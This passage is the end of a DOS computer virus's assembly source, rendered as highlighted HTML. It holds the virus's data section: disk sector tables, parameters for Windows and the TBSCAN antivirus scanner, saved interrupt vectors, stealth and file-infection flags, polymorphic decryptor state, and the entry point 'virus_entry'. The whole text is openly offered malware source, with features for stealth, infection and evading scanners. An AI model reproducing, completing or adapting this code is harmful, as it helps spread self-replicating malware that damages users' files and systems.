                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 09h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 0Ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 0Bh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 0Ch</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 0Dh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 0Eh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 0Fh</span><span class="sc0">

                        </span><span class="sc1">;Command line parameters for win.com</span><span class="sc0">
</span><span class="sc5">win_param_string</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" /d:f"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">

                        </span><span class="sc1">;Command line parameters for tbscan.exe</span><span class="sc0">
</span><span class="sc5">tbscan_param_string</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" co nm"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">

                        </span><span class="sc1">;Old file header</span><span class="sc0">
</span><span class="sc5">old_header</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">file_header_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

                        </span><span class="sc1">;Decryptor key</span><span class="sc0">
</span><span class="sc5">clave_crypt</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Virus data buffer (not inserted into infections)                          ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">virus_data_buffer</span><span class="sc4">:</span><span class="sc0">      
                        </span><span class="sc1">;Old interrupt vectors</span><span class="sc0">

</span><span class="sc5">old03h</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">old03h_off</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old03h_seg</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">old12h</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">old12h_off</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old12h_seg</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">old13h</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">old13h_off</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old13h_seg</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">old1Ch</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">old1Ch_off</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old1Ch_seg</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">old1Eh</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">old1Eh_off</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old1Eh_seg</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">old21h</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">old21h_off</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old21h_seg</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">org21h</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">org21h_off</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">org21h_seg</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">old24h</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">old24h_off</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old24h_seg</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">old40h</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">old40h_off</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old40h_seg</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

                        </span><span class="sc1">;Misc data</span><span class="sc0">

</span><span class="sc5">read_ptr</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">read_off</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">read_seg</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">poly_working_ptr</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">poly_working_off</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">poly_working_seg</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">dos_function</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">file_offset</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">ret_off</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">virus_timer</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">hd_write_words</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">hd_write_cl</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">hd_write_al</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">dos_flag</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">running_sw</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">stealth_sw</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">file_infection_flag</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

                        </span><span class="sc1">;Polymorphic decryptor data</span><span class="sc0">
</span><span class="sc5">poly_data</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">last_fill_type</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">        </span><span class="sc1">;+00h</span><span class="sc0">
</span><span class="sc5">last_step_type</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">        </span><span class="sc1">;+02h</span><span class="sc0">
</span><span class="sc5">last_subroutine</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">        </span><span class="sc1">;+04h</span><span class="sc0">
</span><span class="sc5">decrypt_sub</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">        </span><span class="sc1">;+06h</span><span class="sc0">
</span><span class="sc5">address_loop</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">        </span><span class="sc1">;+08h</span><span class="sc0">
</span><span class="sc5">last_int_type</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;+0Ah</span><span class="sc0">
</span><span class="sc5">decrypt_pointer</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;+0Bh</span><span class="sc0">
</span><span class="sc5">address_register</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;+0Ch</span><span class="sc0">
</span><span class="sc5">decrypt_register</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;+0Dh</span><span class="sc0">
</span><span class="sc5">address_seg_1</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;+0Eh</span><span class="sc0">
</span><span class="sc5">address_seg_2</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;+0Fh</span><span class="sc0">
</span><span class="sc5">rnd_pointer</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">        </span><span class="sc1">;+10h</span><span class="sc0">
</span><span class="sc5">mem_base</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">        </span><span class="sc1">;+12h</span><span class="sc0">
</span><span class="sc5">displ_si_di</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;+14h</span><span class="sc0">
</span><span class="sc5">decrypt_seq</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;+15h</span><span class="sc0">

                        </span><span class="sc1">;Buffer for filename of executed program</span><span class="sc0">
</span><span class="sc5">execute_filename</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

                        </span><span class="sc1">;Buffer for file stealth and infection routines</span><span class="sc0">
</span><span class="sc5">file_buffer</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">file_header_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virus_copy</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">virus_end_buffer</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Done :P                                                                   ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">launcher</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">virus_entry</span><span class="sc0">
</span></div></body>
</html>
